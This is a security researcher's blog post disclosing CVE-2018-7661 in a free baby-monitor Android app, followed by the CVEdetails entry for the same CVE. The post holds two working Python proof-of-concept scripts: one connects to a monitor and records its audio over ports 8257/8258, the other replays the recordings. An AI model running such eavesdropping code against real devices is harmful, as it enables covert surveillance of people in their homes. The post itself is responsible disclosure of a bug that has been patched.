=== Content from blog.manchestergreyhats.co.uk_b67838fe_20250124_184033.html ===

### [Root](https://blog.manchestergreyhats.co.uk)

### MGH Blog - Most recent posts

* [Pwnagotchi Set Up](https://blog.manchestergreyhats.co.uk/posts/2020-01-10-pwnagotchi-setup/)
* [Cyber Strike vs Air Strike](https://blog.manchestergreyhats.co.uk/posts/cyber-strike-vs-air-strike/)
* [PHP Malware Examination Part 2](https://blog.manchestergreyhats.co.uk/2018/11/27/php-malware-examination-part-2/)
* [PHP Malware Examination](https://blog.manchestergreyhats.co.uk/2018/11/07/php-malware-examination/)
* [OWASP CTF Prep - Crypto Challenge](https://blog.manchestergreyhats.co.uk/2018/10/18/owasp-ctf-prep-crypto/)
* [OWASP CTF Prep](https://blog.manchestergreyhats.co.uk/2018/10/18/owasp-ctf-prep/)
* [Bob Vulnhub Vm Writeup](https://blog.manchestergreyhats.co.uk/2018/05/30/bob-vulnhub-ctf-writeup/)
* [STEM CTF Cyber Challenge 2018 Write Up](https://blog.manchestergreyhats.co.uk/2018/04/21/stem-ctf-cyber-challenge/)
* [AES decode with Cyberchef](https://blog.manchestergreyhats.co.uk/2018/04/18/aes-decode-with-cyberchef/)
* [M1Con CTF Write up](https://blog.manchestergreyhats.co.uk/2018/03/28/m1con-ctf-writeup/)

### Tags

* [analysis](/tags/analysis)
* [android](/tags/android)
* [arp](/tags/arp)
* [blog](/tags/blog)
* [brett](/tags/brett)
* [burpsuite](/tags/burpsuite)
* [crypto](/tags/crypto)
* [ctf](/tags/ctf)
* [cyberchef](/tags/cyberchef)
* [dkim](/tags/dkim)
* [dmarc](/tags/dmarc)
* [dns](/tags/dns)
* [frida](/tags/frida)
* [hacking](/tags/hacking)
* [hardware](/tags/hardware)
* [how-to](/tags/how-to)
* [infosec](/tags/infosec)
* [iot](/tags/iot)
* [jay](/tags/jay)
* [jobs](/tags/jobs)
* [john-w](/tags/john-w)
* [journeys](/tags/journeys)
* [linux](/tags/linux)
* [lockpicking](/tags/lockpicking)
* [mail-servers](/tags/mail-servers)
* [malware](/tags/malware)
* [mgh](/tags/mgh)
* [mitm](/tags/mitm)
* [mobile](/tags/mobile)
* [mr-robot](/tags/mr-robot)
* [osint](/tags/osint)
* [owasp](/tags/owasp)
* [paths](/tags/paths)
* [paulw](/tags/paulw)
* [php](/tags/php)
* [raspberry-pi](/tags/raspberry-pi)
* [recruiter](/tags/recruiter)
* [reddit](/tags/reddit)
* [responsible-disclosure](/tags/responsible-disclosure)
* [router](/tags/router)
* [sdr](/tags/sdr)
* [shell-script](/tags/shell-script)
* [short](/tags/short)
* [spf](/tags/spf)
* [tim](/tags/tim)
* [timw](/tags/timw)
* [uart](/tags/uart)
* [usb](/tags/usb)
* [vulnhub](/tags/vulnhub)
* [web-application](/tags/web-application)
* [websec](/tags/websec)
* [weekend-projects](/tags/weekend-projects)
* [wi-fi](/tags/wi-fi)
* [working-in-infosec](/tags/working-in-infosec)

### Categories

* [articles](/categories/articles)
* [authors](/categories/authors)
* [ctf](/categories/ctf)
* [misc](/categories/misc)
* [talks](/categories/talks)
* [workshop](/categories/workshop)

# Eavesdropping on WiFi Baby Monitor

#### Published 02-25-2018 00:00:00

Written by [Rob](/authors/rob/)

Whilst analysing a number of free communication based applications on the Google Play Store, I took a look at [WiFi Baby Monitor: Free & Lite](https://play.google.com/store/apps/details?id=com.papenmeier.wifibabymonitor.free&hl=en_GB) (the free version of [WiFi Baby Monitor](https://play.google.com/store/apps/details?id=com.papenmeier.wifibabymonitor&hl=en_GB)). Although the premium version offered users the ability to specify a password to be used in the pairing process, the free version offered no such function.

Monitoring the traffic using Wireshark during the pairing process revealed:

* The initial connection is made on port 8257
* To start the pairing process, the same sequence is sent each time
* After the pairing process is finished, another connection is opened to port 8258, where the audio data will be transmitted
* After the connection is made to port 8258, the connection on port 8257 is kept open and used as a heartbeat for the session
* On the heartbeat connection, the client will periodically send `0x01` to the baby monitor (roughly once per second)

## Abusing The Protocol to Record Audio

With the pairing process reversed, it was possible to create a proof of concept which proved that it was possible to deploy a small program into a compromised network which would eavesdrop on a baby monitor and allow for an attacker to play the recording back at a later date at their discretion.

The [very hacky] proof of concept code can be found below:

```
import socket
import sys
import time

if len(sys.argv) < 2:
    print "Usage: python {file} target_ip [port]".format(file = sys.argv[0])
    exit(1)

target = sys.argv[1]
port = 8257

if len(sys.argv) == 3:
    port = int(sys.argv[2])

s = socket.socket()
s.connect((target, port))
s.send('\x01')
s.send('\x02\x64\x00\x00\x00\x13\x2b\x52\x65\x63\x65\x69\x76\x65\x72\x53' +
       '\x74\x61\x72\x74\x5f\x32\x2e\x30\x32\x00\x00\x00\x00\x03\x23\x31' +
       '\x30\x00\x00\x00\x00\x03\x23\x32\x30\x00\x00\x00\x00\x03\x23\x32' +
       '\x31\x00\x00\x00\x00\x03\x23\x32\x32\x00\x00\x00\x00\x03\x23\x32' +
       '\x33')

heartbeat_dump = open('dump.heartbeat.bin', 'wb')
data_dump = open('dump.data.bin', 'wb')

has_data_socket = False
data_socket = socket.socket()
delta = 0

while True:
    time.sleep(1)
    data = s.recv(2048)
    if data is not None:
        heartbeat_dump.write(data)
        print '[*] Received {bytes} bytes on heartbeat socket'.format(bytes = len(data))
        s.send('\x01')

    if has_data_socket:
        data = data_socket.recv(2048)
        if data is not None:
            data_dump.write(data)
            print '[*] Received {bytes} bytes on data socket'.format(bytes = len(data))
            data_socket.send('\x01')
    else:
        print '[*] Establishing data connection'
        data_socket.connect((target, 8258))
        data_socket.send('\x01')
        data_socket.send('\x02\x64\x00\x00\x00\x07\x33\x5f\x5f\x30\x30\x30\x30')
        has_data_socket = True
        print '[*] Established data connection'

    delta += 1

heartbeat_dump.close
data_dump.close

```

This script establishes a connection to the baby monitor and begins to dump out the data from port 8257 to `dump.heartbeat.bin` and the data from port 8258 to `dump.data.bin`.

## Replaying the Recordings

In order to replay the recordings made by the proof of concept, I created a second script which would act as a baby monitor and replay the data back to a client; which allows for replay via the original application:

```
import socket
import sys
import time

s = socket.socket()
s.bind(('0.0.0.0', 8257))
s.listen(5)
print '[*] Heartbeat socket listening on port 8257'

data_socket = socket.socket()
data_socket.bind(('0.0.0.0', 8258))
data_socket.listen(5)
print '[*] Data socket listening on port 8258'

data = ''
with open('dump.heartbeat.bin', 'r') as replay_file:
    data = replay_file.read()

wav_data = ''
with open('dump.data.bin', 'r') as wav_file:
    wav_data = wav_file.read()

c, addr = s.accept()
print '[*] Connection from {client}'.format(client = addr)
c.send(data)

data_connection, addr = data_socket.accept()
print '[*] Data connection from {client}'.format(client = addr)
data_connection.send(wav_data)

buf_start = 0
buf_end = wav_data.find('\x00\x00\x00\x01', 1)
buf = wav_data[buf_start:buf_end]

while buf is not None:
    c.send('\x01')
    print '[*] Sending {bytes} bytes'.format(bytes = len(buf))
    data_connection.send(buf)
    time.sleep(0.1)

    if buf_end == -1 or buf_start == -1:
        buf = None
    else:
        buf_start = buf_end
        buf_end = wav_data.find('\x00\x00\x00\x01', buf_end + 1)
        if buf_end == -1:
            buf = wav_data[buf_start:]
        else:
            buf = wav_data[buf_start:buf_end]

data_connection.close()
c.close()
print '[*] Connection closed'

```

A demonstration of the replay script accepting a connection from a client and replaying a recording can be seen below:

## Solution

When notified, the vendor took the [respectably] responsible approach and made available to the free version the security features that were previously exclusive to the premium version.

To prevent this attack, users can simply update to the latest version of the application (v2.02.2, at the time of writing this).

## CVE-ID

[CVE-2018-7661](https://www.cvedetails.com/cve/CVE-2018-7661/)

## CVSS Score

**CVSS Base Score**: 5.9

**Impact Subscore**: 4.2

**Exploitability Subscore**: 1.6

**CVSS Temporal Score**: 5.3

**Overall CVSS Score**: 5.3

**Vector:** [AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:H/E:P/RL:O/RC:C](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:H/E:P/RL:O/RC:C)

## Disclosure Timeline

* **2018-02-11**: Initial contact with vendor to make them aware of the attack vector
* **2018-02-12**: Vendor acknowledged the issue and provided keys to test the premium version to verify the encryption and password protection would resolve the issue
* **2018-02-15**: Confirmation sent to vendor to let them know the proposed solution should nullify the attack
* **2018-02-16**: Vendor begins roll-out process for the new update
* **2018-02-22**: Roll-out process completed and version 2.02.2 made available to the public



=== Content from www.cvedetails.com_37c95fcc_20250126_025003.html ===

[Documentation](/documentation/ "User guide and product documentation")

[Documentation](/documentation/ "User guide and product documentation")

* [Log in](/sign-in "Login")

[![](/img/ssc-logo.svg "SecurityScorecard")
CVEdetails.com](/ "Go to cvedetails.com homepage")
[powered by SecurityScorecard](https://securityscorecard.com?utm_source=cvedetails)

Vulnerabilities

[By Date](/browse-by-date.php "Browse security vulnerabilities by date")
[By Type](/vulnerabilities-by-types.php "Vulnerability distribution by type")
[Known Exploited](/cisa-known-exploited-vulnerabilities/kev-1.html "Vulnerabilities in the CISA Known Exploited Vulnerabilities (KEV) catalog")
[Assigners](/cve-assigners-cnas/1.html "CVE sources, assigners")
[CVSS Scores](/cvss-score-charts.php "CVSS score distribution report")
[EPSS Scores](/epss/epss-score-history.html?delta=110 "EPSS score change history")
[Search](/vulnerability-search.php "Vulnerability search")

Vulnerable Software

[Vendors](/vendor.php "Browse software and hardware vendors")
[Products](/product-list.php "Browse software and hardware products")
[Version Search](/version-search.php "Search for product versions")

Vulnerability Intel.

[Newsfeed](/data/list "Newsfeed, things you need to know, most recent first")
[Open Source Vulns](/osv/ecosystem/list "Vulnerabilities in open source projects and ecosystems")
[Emerging CVEs](/data/emerging-CVEs "CVEs discovered in other sources but not yet published")
[Feeds](/feed-aggregator/feed-list "RSS feed aggregator")
[Exploits](/exploit/list "Exploits from exploit-db, packetstorm and metasploit")
[Advisories](/advisory/list "Security advisories from vendors and other sources like github")
[Code Repositories](/code/repositories "Monitored open source repositories")
[Code Changes](/code/changes "Source code changes related to security issues and CVEs")

Attack Surface

[My Attack Surface](/asi/my-attack-surface "External attack surface summary for my organization")
[Digital Footprint](/asi/my-digital-footprint "Digital footprint of my organization")
[Discovered Products](/asi/discovered-products "Products discovered on my attack surface by scanners")
[Detected Vulns](/asi/detected-vulns "Vulnerabilities detected on my attack surface by scanners")
[IP Search](/asi/ip-details "Search for an IP address")

Other

[Metasploit Modules](/metasploit-modules/1.html "Metasploit modules and related CVEs")
[CWE Definitions](/cwe-definitions/ "CWE definitions")
[CAPEC Definitions](/capec-definitions/ "CAPEC definitions")
[Articles](https://securityscorecard.com/research/?utm_source=cvedetails "Featured research articles from SecurityScorecard")
[Blog](https://securityscorecard.com/blog/?utm_source=cvedetails "SecurityScorecard blog")

# Vulnerability Details : [CVE-2018-7661](/cve/CVE-2018-7661/ "CVE-2018-7661 security vulnerability details")

Papenmeier WiFi Baby Monitor Free & Lite before 2.02.2 allows remote attackers to obtain audio data via certain requests to TCP ports 8258 and 8257.

Published
2018-03-04 22:29:00
Updated
2018-03-29 14:42:16
Source
[MITRE](/vulnerability-list/assigner-1/MITRE.html "CVEs created by MITRE")

View at

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-7661 "Vulnerability details at NVD"),

[CVE.org](https://www.cve.org/CVERecord?id=CVE-2018-7661 "Vulnerability details at CVE project")

Vulnerability category: Information leak

## Products affected by CVE-2018-7661

* [Babyphonemobile](/vendor/22001/Babyphonemobile.html "Details for Babyphonemobile") Â» [Wifi Baby Monitor](/version-list/22001/71328/1/Babyphonemobile-Wifi-Baby-Monitor.html "Babyphonemobile Wifi Baby Monitor versions list")  Versions before (<) 2.02.2cpe:2.3:a:babyphonemobile:wifi\_baby\_monitor:\*:\*:\*:\*:\*:\*:\*:\* [Matching versions](/version-search.php?cpeMatchCriteriaId=8451c920-0141-4f77-978f-0c11d5441698 "Matching product versions")

## Exploit prediction scoring system (EPSS) score for CVE-2018-7661

[EPSS FAQ](/epss/faq.html "Exploit Prediction Scoring System (EPSS) FAQ")

0.25%
Probability of exploitation activity in the next 30 days
[EPSS Score History](/epss/CVE-2018-7661/epss-score-history.html "Exploit Prediction Scoring System (EPSS) score history for CVE-2018-7661")

~ 64 %

Percentile, the proportion of vulnerabilities that are scored at or less

## CVSS scores for CVE-2018-7661

| Base Score | Base Severity | CVSS Vector | Exploitability Score | Impact Score | Score Source | First Seen |
| --- | --- | --- | --- | --- | --- | --- |
| 2.9 | LOW | AV:A/AC:M/Au:N/C:P/I:N/A:N | 5.5 | 2.9 | NIST |  |
| Access Vector: Adjacent NetworkAccess Complexity: MediumAuthentication: NoneConfidentiality Impact: PartialIntegrity Impact: NoneAvailability Impact: None | | | | | | |
| 5.3 | MEDIUM | CVSS:3.0/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N | 1.6 | 3.6 | NIST |  |
| Attack Vector: Adjacent NetworkAttack Complexity: HighPrivileges Required: NoneUser Interaction: NoneScope: UnchangedConfidentiality: HighIntegrity: NoneAvailability: None | | | | | | |

## CWE ids for CVE-2018-7661

* [CWE-200 Exposure of Sensitive Information to an Unauthorized Actor](/cwe-details/200/Exposure-of-Sensitive-Information-to-an-Unauthorized-Actor.html "CWE-200 - CWE definition")

  The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information.
  Assigned by:
  nvd@nist.gov (Primary)

## References for CVE-2018-7661

* [https://www.exploit-db.com/exploits/442322/](https://www.exploit-db.com/exploits/442322/ "Open reference url in new window - External link")
  404 Page Not Found | Exploit Database Broken Link
* [https://blog.manchestergreyhats.co.uk/2018/02/25/eavesdropping-on-wifi-baby-monitor/](https://blog.manchestergreyhats.co.uk/2018/02/25/eavesdropping-on-wifi-baby-monitor/ "Open reference url in new window - External link")
  Eavesdropping on WiFi Baby Monitor Exploit;Technical Description

Jump to
CVE Summary
Affected Products
EPSS Score
CVSS Scores
CWEs
References

[About](/about-contact.php "About cvedetails.com")
[Terms of Use](/terms-and-conditions.php)
[Privacy Policy](/privacy.php)
[CVE Help](/cve-help.php "Help topics and more information about CVE")
[FAQ](/faq.php "Frequently asked questions")
[How it works](/how-does-it-work.php "Known limitations & technical details")

![](/img/ssc-logo.svg "SecurityScorecard")

SecurityScorecard

1140 Avenue of the Americas

19th Floor

New York, NY 10036

info@securityscorecard.io

United States: (800) 682-1707

International: +1(646) 809-2166

[Products](https://securityscorecard.com/product/?utm_source=cvedetails "SecurityScorecard products. Security ratings, automated assessments, and guidance")

[Solutions](https://securityscorecard.com/solutions?utm_source=cvedetails "SecurityScorecard Cybersecurity Risk Rating & Third-Party Risk Management Solutions")

[Customers](https://securityscorecard.com/customers/?utm_source=cvedetails "SecurityScorecard customers")

[Marketplace](https://platform.securityscorecard.io/#/marketplace?utm_source=cvedetails "SecurityScorecard Marketplace. Apps integrations and partners")

[Partners](https://securityscorecard.com/partners/?utm_source=cvedetails "SecurityScorecard partners")

[Resources](https://securityscorecard.com/resources/?utm_source=cvedetails "SecurityScorecard case studies, reports, ebooks and more resources")

[Company](https://securityscorecard.com/company/?utm_source=cvedetails "SecurityScorecard company and organization")

[Trust Portal](https://securityscorecard.com/trust/?utm_source=cvedetails "SecurityScorecard trust portal. Transparency into ratings methodology, insights into how it aligns with industry standards")

[Security Ratings](https://securityscorecard.com/security-rating?utm_source=cvedetails "SecurityScorecard security ratings")

[Login](https://platform.securityscorecard.io/#/start?utm_source=cvedetails "SecurityScorecard platform login")

[Blog](https://securityscorecard.com/blog/?utm_source=cvedetails "SecurityScorecard blog")

[Contact](https://securityscorecard.com/company/contact-us/?utm_source=cvedetails "Contact SecurityScorecard")

[Careers](https://securityscorecard.com/company/careers/?utm_source=cvedetails "SecurityScorecard careers")

[Feedback](https://support.securityscorecard.com?utm_source=cvedetails "Feedback")

This product uses data from the NVD API but is not endorsed or certified by the NVD.
See [NVD website](http://nvd.nist.gov "National vulnerability database web site - External link ") for more information.
CVE is a registred trademark of the MITRE Corporation and the authoritative source of CVE content is
[MITRE's CVE web site](http://cve.mitre.org/).
CWE is a registred trademark of the MITRE Corporation and the authoritative source of CWE content is
[MITRE's CWE web site](http://cwe.mitre.org/).
OVAL is a registered trademark of The MITRE Corporation and the authoritative source of OVAL content is
[MITRE's OVAL web site](http://oval.mitre.org).

This web site uses cookies for managing your session, storing preferences, website analytics and additional purposes
described in our [privacy policy](/privacy.php).

By using this web site you are agreeing to CVEdetails.com
[terms of use](/terms-and-conditions.php)!

Accept
Close


